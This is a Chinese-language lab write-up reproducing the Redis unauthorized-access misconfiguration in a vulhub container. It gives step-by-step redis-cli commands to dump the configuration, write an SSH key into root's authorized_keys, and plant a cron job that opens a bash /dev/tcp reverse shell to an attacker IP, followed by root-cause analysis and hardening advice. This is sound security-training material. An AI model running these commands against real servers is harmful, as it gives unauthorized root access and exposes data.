# Redis 未授权访问漏洞复现笔记

## 一、漏洞基础信息

### 1.1 漏洞简介

Redis 未授权访问漏洞并非特定版本的漏洞，而是由于 Redis 服务配置不当导致的高危安全问题。Redis 是一款开源的高性能键值对数据库，默认监听 6379 端口，若管理员未设置访问密码、未限制绑定 IP，攻击者可直接通过 redis-cli 等工具连接 Redis 服务，执行任意命令，最终导致敏感数据泄露、服务器权限被获取（如写入 SSH 公钥、反弹 shell）等严重危害。

该漏洞广泛存在于未做安全加固的 Redis 部署环境中，尤其在云服务器、测试环境中极为常见，利用难度极低，危害极大，是渗透测试中高频出现的漏洞类型之一。

### 1.2 影响范围

所有版本的 Redis，只要存在以下配置不当，均会受到影响：

- Redis 配置文件（redis.conf）中，`bind` 参数设置为 0.0.0.0（允许所有 IP 访问），未限制仅本地或指定 IP 访问；
- 未设置访问密码（`requirepass` 参数为空），无需认证即可连接；
- Redis 3.2.0 及以上版本中，`protected-mode`（保护模式）设置为 no（关闭保护模式）；
- Redis 以 root 等高权限用户运行，为攻击者进一步获取服务器权限提供条件。

### 1.3 安全配置方案

- 限制 `bind` 参数为本地回环地址（127.0.0.1）或指定授权 IP；
- 设置复杂的访问密码（`requirepass` 参数）；
- 开启保护模式（`protected-mode yes`）；
- 以低权限用户（如 redis 专用用户）运行 Redis 服务；
- 关闭不必要的危险命令（如 config、flushall 等）。

### 1.4 漏洞风险等级

高危（CVSS 评分可达到 9.8 分，远程未授权访问，可直接获取服务器权限，泄露核心敏感数据，危害极大）

## 二、复现环境准备

### 2.1 环境要求

- 操作系统：kali；
- 工具依赖：Docker、Docker-Compose（用于快速搭建 vulhub 靶场环境）；
- 网络要求：靶机与攻击机（本地终端即可）网络互通，靶机开放 6379 端口（Redis 默认端口）；
- 攻击工具：redis-cli（Redis 客户端，攻击机需安装）、nc（用于监听反弹 shell，可选）、终端（执行 Docker 命令和攻击命令）。

### 2.2 环境搭建步骤

#### 2.2.1 安装 Docker 与 Docker-Compose

若已安装过 Docker 和 Docker-Compose，可直接跳过此步骤；未安装则执行以下命令：

```bash
# 更新软件源列表
apt-get update
# 安装 https 协议及 CA 证书
apt-get install -y apt-transport-https ca-certificates
# 安装 Docker
apt install docker.io
# 验证 Docker 安装成功
docker run hello-world

# 安装 pip3（用于安装 Docker-Compose）
apt-get install python3-pip
# 安装 Docker-Compose
pip3 install docker-compose
# 验证 Docker-Compose 安装成功
docker-compose -v
```

#### 2.2.2 下载 vulhub 靶场并启动漏洞环境

vulhub 已打包好 Redis 未授权访问漏洞环境（基于 Redis 4.0 版本，配置为未授权访问模式），直接下载并启动即可：

```bash
# 克隆 vulhub 仓库（若网络较差，可直接下载压缩包解压）
git clone https://github.com/vulhub/vulhub.git
# 进入 Redis 未授权访问漏洞目录（vulhub 中对应目录为 redis/unacc）
cd vulhub/redis/unacc
# 构建并启动漏洞环境（首次启动会下载镜像，耗时稍长）
docker-compose build
docker-compose up -d
# 查看环境启动状态（确保容器正常运行，监听 6379 端口）
docker ps
# 验证 6379 端口是否开放
netstat -tulnp | grep 6379
```

启动成功后，容器会将 6379 端口映射到靶机本地，此时 Redis 服务处于未授权访问状态（无密码、允许所有 IP 访问、关闭保护模式）。

<img src="D:\security-study\writeups\images\image-20260313223018332.png" alt="image-20260313223018332" style="zoom:67%;" />

#### 2.2.3 攻击机安装 redis-cli

攻击机（本地终端或 Kali）需安装 redis-cli 工具，用于连接靶机的 Redis 服务，执行以下命令安装：

```bash
# Ubuntu/Kali 系统安装
apt-get install redis-tools
# 验证安装成功（显示版本号即为成功）
redis-cli -v
```

![image-20260313223132740](D:\security-study\writeups\images\image-20260313223132740.png)

## 三、漏洞复现步骤

复现核心：利用 Redis 未授权访问漏洞，通过 redis-cli 连接靶机 Redis 服务，执行 Redis 命令获取敏感信息，进一步通过写入 SSH 公钥、反弹 shell 等方式获取服务器权限，全程无需授权。

假设靶机 IP 为 192.168.101.136（可通过 `ifconfig` 命令查看靶机 IP），攻击机 IP 为 192.168.111.1（本地电脑）。

### 3.1 验证漏洞存在（连接 Redis 服务）

1. 攻击机打开终端，执行以下命令，尝试连接靶机的 Redis 服务（无密码）：

```bash
redis-cli -h 192.168.101.136 -p 6379
```

![image-20260313223500863](D:\security-study\writeups\images\image-20260313223500863.png)

2. 若连接成功，终端会显示 `192.168.101.136:6379>` 提示符，说明漏洞存在，可直接执行 Redis 命令；
3. 执行简单命令验证可控性，例如查看 Redis 服务信息：

```bash
192.168.101.136:6379> info # 查看 Redis 版本、运行状态、数据库信息等
192.168.101.136:6379> keys * # 查看所有键（默认可能为空，可自行写入测试）
192.168.101.136:6379> set test "unauthorized access" # 写入测试数据
192.168.101.136:6379> get test # 读取测试数据，验证可写可读
```

<img src="D:\security-study\writeups\images\image-20260313223622968.png" alt="image-20260313223622968" style="zoom:67%;" />

<img src="D:\security-study\writeups\images\image-20260313223704819.png" alt="image-20260313223704819" style="zoom:67%;" />

若以上命令均能正常执行，说明 Redis 服务完全处于未授权可控状态。

### 3.2 利用漏洞获取敏感信息

通过 Redis 命令，可直接获取服务器及 Redis 服务的敏感信息，常用命令如下：

```bash
# 1. 查看 Redis 详细信息（版本、运行用户、配置文件路径等）
192.168.101.136:6379> info all

# 2. 查看 Redis 配置信息（关键配置，如 bind、requirepass、protected-mode 等）
192.168.101.136:6379> config get * # 查看所有配置
192.168.101.136:6379> config get bind # 查看绑定 IP
192.168.101.136:6379> config get requirepass # 查看访问密码（为空则未设置）
192.168.101.136:6379> config get protected-mode # 查看保护模式状态

# 3. 查看数据库内容（若存在业务数据，可获取敏感信息，如用户密码、业务配置等）
192.168.101.136:6379> select 0 # 切换到 0 号数据库（Redis 默认16个数据库，编号0-15）
192.168.101.136:6379> keys * # 查看当前数据库所有键
192.168.101.136:6379> get 键名 # 读取指定键的内容（如 get username、get password）

# 4. 查看 Redis 运行用户（若为 root，可进一步利用获取服务器权限）
192.168.101.136:6379> config get dir # 查看数据存储目录（默认 /data）
192.168.101.136:6379> system whoami # 执行系统命令（部分环境支持，直接查看运行用户）
```

通过以上命令，可获取 Redis 版本、运行用户、配置信息，若存在业务数据，还能直接泄露核心敏感数据（如用户账号密码、订单信息等）。

### 3.3 利用漏洞获取服务器权限（两种常用方法）

由于 vulhub 环境中 Redis 以 root 用户运行，且靶机开启 SSH 服务，可通过两种常用方式获取服务器 shell 权限，优先推荐方法一（写入 SSH 公钥），成功率更高。

#### 3.3.1 方法一：写入 SSH 公钥，免密登录服务器

核心原理：利用 Redis 的 config 命令修改数据存储路径和文件名，将攻击机的 SSH 公钥写入靶机的 `/root/.ssh/authorized_keys` 文件，实现免密 SSH 登录靶机。

步骤如下：

1. 攻击机生成 SSH 密钥对（无需设置密码，直接回车即可）：

```bash
ssh-keygen -t rsa # 生成密钥对，默认保存在 /root/.ssh/ 目录下
# 执行后，会生成 id_rsa（私钥，攻击机保留）和 id_rsa.pub（公钥，需写入靶机）
```

2. 处理 SSH 公钥（在公钥前后添加换行符，避免 Redis 存储时格式错误，导致 SSH 登录失败）：

```bash
cd /root/.ssh/ # 进入密钥存储目录
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > redis_ssh.pub # 将公钥处理后保存到 redis_ssh.pub 文件
```

<img src="D:\security-study\writeups\images\image-20260313224157349.png" alt="image-20260313224157349" style="zoom:67%;" />

3. 将处理后的公钥写入靶机的 Redis 服务：

```bash
# 攻击机终端执行，将公钥文件内容写入 Redis 的 key 中（key 名任意，如 ssh_key）
cat redis_ssh.pub | redis-cli -h 192.168.101.136 -p 6379 -x set ssh_key

# 连接 Redis 服务，验证公钥是否写入成功
redis-cli -h 192.168.101.136 -p 6379
192.168.101.136:6379> get ssh_key # 查看公钥内容，确认写入成功
```

<img src="D:\security-study\writeups\images\image-20260313224605656.png" alt="image-20260313224605656" style="zoom:67%;" />

注:vulhub里面的redis未授权漏洞是入门靶场，所以后面的是思路，无截图

4. 修改 Redis 配置，将公钥写入靶机的 SSH 授权文件：

```bash
# 设置 Redis 数据存储路径为靶机的 SSH 授权目录（root 用户的 .ssh 目录）
192.168.101.136:6379> config set dir /root/.ssh/
# 设置存储文件名为 authorized_keys（SSH 免密登录的授权文件）
192.168.101.136:6379> config set dbfilename authorized_keys
# 保存配置，将 Redis 中的公钥写入到靶机的 authorized_keys 文件中
192.168.101.136:6379> save
```

5. 攻击机通过 SSH 免密登录靶机（使用生成的私钥）：

```bash
ssh -i /root/.ssh/id_rsa root@192.168.101.136
```

登录成功后，即可获得靶机的 root 权限，可执行任意系统命令（如 `ls`、`pwd`、`whoami` 等），漏洞利用成功。

#### 3.3.2 方法二：写入定时任务，反弹 shell

核心原理：利用 Redis 写入 Linux 定时任务（crontab），设置定时执行反弹 shell 命令，攻击机监听对应端口，接收靶机的 shell 连接。

步骤如下：

1. 攻击机开启 nc 监听，等待靶机反弹 shell（监听端口任意，如 8888）：

```bash
nc -lvnp 8888 # -l 监听模式，-v 显示详细信息，-n 不解析域名，-p 指定端口
```

2. 另开一个攻击机终端，连接靶机的 Redis 服务，写入定时任务：

```bash
redis-cli -h 192.168.101.136 -p 6379
# 设置 Redis 数据存储路径为 Linux 定时任务目录（CentOS/Ubuntu 通用路径）
192.168.101.136:6379> config set dir /var/spool/cron/
# 设置存储文件名为 root（root 用户的定时任务文件）
192.168.101.136:6379> config set dbfilename root
# 写入反弹 shell 定时任务（每分钟执行一次，避免执行失败）
# 注意：将 192.168.111.1 替换为攻击机 IP，8888 替换为攻击机监听端口
192.168.101.136:6379> set反弹_shell "\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.111.1/8888 0>&1\n\n"
# 保存配置，将定时任务写入靶机的定时任务文件
192.168.101.136:6379> save
```

3. 等待 1 分钟左右，攻击机的 nc 监听终端会收到靶机反弹的 shell，显示 `bash-4.4#`（root 权限），即可执行任意系统命令，漏洞利用成功。

注意：若反弹失败，可检查攻击机端口是否开放、靶机是否能访问攻击机 IP，或替换反弹 shell 命令为 `bash -c 'exec bash -i >&/dev/tcp/攻击机IP/端口 <&1'`。



## 四、漏洞原理深度分析

### 4.1 核心原因

Redis 未授权访问漏洞的核心是 **配置不当**，而非软件本身的代码缺陷，主要体现在以下三点：

- 绑定地址过宽：默认配置 `bind 0.0.0.0`，允许公网所有 IP 访问 Redis 服务，而非仅绑定本地回环地址（127.0.0.1），导致外部攻击者可直接连接；
- 缺乏身份认证：默认未设置访问密码（`requirepass` 参数为空），Redis 服务不验证连接者身份，任何人都可直接连接并执行命令；
- 保护模式关闭：Redis 3.2.0 及以上版本新增保护模式（`protected-mode yes`），默认开启时，禁止外部 IP 无密码访问，但管理员手动关闭后，会失去该保护；
- 高权限运行：Redis 若以 root 用户运行，攻击者可通过 config 命令修改数据存储路径和文件名，向服务器任意目录写入文件（如 SSH 公钥、定时任务），进而获取服务器权限。

### 4.2 关键配置分析

Redis 配置文件（redis.conf）中，与该漏洞相关的关键配置如下，不当配置会直接导致漏洞产生：

```ini
# 1. bind 参数：绑定的 IP 地址，多个 IP 用空格分隔
bind 0.0.0.0 # 危险配置：允许所有 IP 访问
bind 127.0.0.1 # 安全配置：仅允许本地访问
bind 192.168.101.136 # 安全配置：仅允许指定 IP 访问

# 2. requirepass 参数：访问密码，为空则未设置
requirepass 12345678 # 安全配置：设置复杂密码
requirepass "" # 危险配置：未设置密码

# 3. protected-mode 参数：保护模式（Redis 3.2.0+）
protected-mode no # 危险配置：关闭保护模式，允许外部无密码访问
protected-mode yes # 安全配置：开启保护模式，禁止外部无密码访问

# 4. daemonize 参数：是否后台运行（与漏洞无关，但影响部署）
daemonize yes # 后台运行
daemonize no # 前台运行
```

### 4.3 漏洞利用条件

- 靶机 Redis 服务监听 6379 端口，且可被攻击机访问（网络互通）；
- Redis 配置不当（bind 0.0.0.0、未设置密码、保护模式关闭）；
- Redis 以 root 或具有写入权限的用户运行（便于写入 SSH 公钥、定时任务等文件）；
- 靶机开启 SSH 服务（方法一需要）或 crontab 服务（方法二需要，默认开启）。

## 五、漏洞修复建议

### 5.1 核心修复方案（首选）

针对配置不当问题，进行安全加固，从源头杜绝漏洞，具体步骤如下：

1. 限制访问 IP：修改 redis.conf 中的 `bind` 参数，仅绑定本地回环地址（127.0.0.1）或指定的授权 IP，禁止公网访问；
2. 设置强密码：修改 `requirepass` 参数，设置复杂且唯一的访问密码（包含大小写字母、数字、特殊符号，长度不小于 12 位）；
3. 开启保护模式：确保 `protected-mode` 参数设置为`yes`（Redis 3.2.0+ 版本），禁止外部无密码访问；
4. 低权限运行：创建专用的 redis 用户（如 `useradd -r -s /sbin/nologin redis`），以该用户运行 Redis 服务，避免使用 root 用户；
5. 关闭危险命令：修改 redis.conf，禁用 config、flushall、flushdb 等危险命令，避免攻击者利用这些命令破坏数据或写入文件，例如：`rename-command CONFIG ""`、`rename-command FLUSHALL ""`；
6. 限制端口访问：通过防火墙（如 iptables、ufw）限制 6379 端口的访问，仅允许授权 IP 访问。

### 5.2 临时修复方案（无法立即加固时）

- 临时关闭 Redis 服务，避免被攻击者利用（适用于非核心业务）；
- 临时开启保护模式、设置简单密码，缓解漏洞危害，后续再进行全面加固；
- 临时限制 6379 端口的访问，仅允许本地 IP 连接。

### 5.3 定期维护建议

- 定期检查 Redis 配置文件，确保安全配置未被篡改；
- 定期更新 Redis 版本，修复软件本身的其他安全漏洞（如 CVE-2025-49844 等高危 RCE 漏洞）；
- 定期查看 Redis 日志，排查异常连接和操作，及时发现攻击行为；
- 禁止在公网暴露 Redis 服务，若需远程访问，可通过 VPN 或加密通道连接。



## 六、复现总结

Redis 未授权访问漏洞是典型的配置类漏洞，而非软件代码漏洞，其利用难度极低、危害极大，是渗透测试中最常见的高危漏洞之一。本次复现通过 vulhub 快速搭建未授权访问环境，成功连接 Redis 服务、获取敏感信息，并通过写入 SSH 公钥、反弹 shell 两种方式获取了靶机的 root 权限，充分验证了该漏洞的危害性。

修复该漏洞的关键在于做好 Redis 的安全加固，核心是限制访问 IP、设置强密码、开启保护模式、以低权限运行服务，同时定期维护和检查，从源头避免配置不当导致的安全风险。通过本次复现，可深入理解 Redis 未授权访问漏洞的原理及利用方式，掌握 Redis 安全加固的核心方法，提升服务器安全防护意识。